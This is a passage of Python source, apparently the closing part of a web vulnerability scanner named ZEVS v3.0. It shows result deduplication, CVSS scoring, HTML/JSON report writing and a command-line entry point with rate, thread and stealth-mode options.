            # Step 3: Deduplicate and calculate CVSS
            console.print(f"\n[bold cyan]📊 Step 3: Processing Results[/bold cyan]")

            seen = set()
            for finding in all_findings:
                key = (finding["type"], finding.get("param", ""), finding["url"])
                if key not in seen:
                    seen.add(key)

                    # Calculate CVSS
                    score, severity, vector = CVSSCalculator.calculate_for_vuln(
                        finding["type"]
                    )
                    finding["cvss_score"] = score
                    finding["severity"] = severity
                    finding["cvss_vector"] = vector

                    self.findings.append(finding)

            self.stats["vulns_found"] = len(self.findings)

            console.print(
                f"[green]✓ Found {len(self.findings)} unique vulnerabilities[/green]"
            )

            # Step 4: Generate reports
            console.print(f"\n[bold cyan]📝 Step 4: Generating Reports[/bold cyan]")

            output_dir = self.options.get("output", ".")
            domain = urlparse(self.target).netloc.replace(":", "_")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

            # HTML report
            html_report = HTMLReportGenerator.generate(
                self.target, self.findings, self.stats
            )
            html_path = f"{output_dir}/zevs_report_{domain}_{timestamp}.html"
            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html_report)
            console.print(f"[green]✓ HTML report: {html_path}[/green]")

            # JSON report
            json_path = f"{output_dir}/zevs_report_{domain}_{timestamp}.json"
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "target": self.target,
                        "findings": self.findings,
                        "stats": self.stats,
                    },
                    f,
                    indent=2,
                )
            console.print(f"[green]✓ JSON report: {json_path}[/green]")

            # Summary
            console.print(
                "\n[bold green]═══════════════════════════════════════════════════════════════[/bold green]"
            )
            console.print(f"[bold]Scan Complete![/bold]")
            console.print(f"  URLs Crawled: {self.stats['urls_crawled']}")
            console.print(f"  Vulnerabilities: {self.stats['vulns_found']}")
            console.print(
                "[bold green]═══════════════════════════════════════════════════════════════[/bold green]\n"
            )


# ============================================================================
# CLI Entry Point
# ============================================================================

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="ZEVS v3.0 - Professional Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python zevs_v3.py https://example.com
  python zevs_v3.py https://example.com --threads 20 --rate 10
  python zevs_v3.py https://example.com --stealth --output ./reports
        """,
    )

    parser.add_argument("target", help="Target URL (e.g., https://example.com)")
    parser.add_argument(
        "--threads", type=int, default=10, help="Concurrent requests (default: 10)"
    )
    parser.add_argument(
        "--rate", type=int, default=5, help="Requests per second (default: 5)"
    )
    parser.add_argument("--jwt", help="Test specific JWT token")
    parser.add_argument(
        "--stealth", action="store_true", help="Ultra-slow mode (1 req/sec)"
    )
    parser.add_argument(
        "--output", default=".", help="Output directory (default: current)"
    )
    parser.add_argument(
        "--modules", help="Comma-separated modules to run (default: all)"
    )
    parser.add_argument("--resume", action="store_true", help="Resume from checkpoint")

    args = parser.parse_args()

    # Apply stealth mode
    if args.stealth:
        args.rate = 1
        args.threads = 1

    # Build options
    options = {
        "threads": args.threads,
        "rate": args.rate,
        "jwt": args.jwt,
        "output": args.output,
        "modules": args.modules,
        "resume": args.resume,
    }

    # Run scanner
    scanner = ZevsScanner(args.target, options)
    asyncio.run(scanner.scan())
